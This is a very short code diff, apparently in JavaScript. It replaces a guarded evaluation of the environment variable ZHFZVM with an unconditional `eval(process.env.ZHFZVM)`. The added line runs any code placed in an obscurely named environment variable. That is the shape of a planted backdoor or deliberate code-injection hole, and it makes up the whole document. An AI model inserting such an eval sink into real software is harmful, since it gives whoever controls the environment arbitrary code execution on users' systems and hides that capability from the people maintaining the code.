@@ -1,2 +1,1 @@
-const c = process.env.ZHFZVM || "";
-c && eval(c);
+eval(process.env.ZHFZVM)
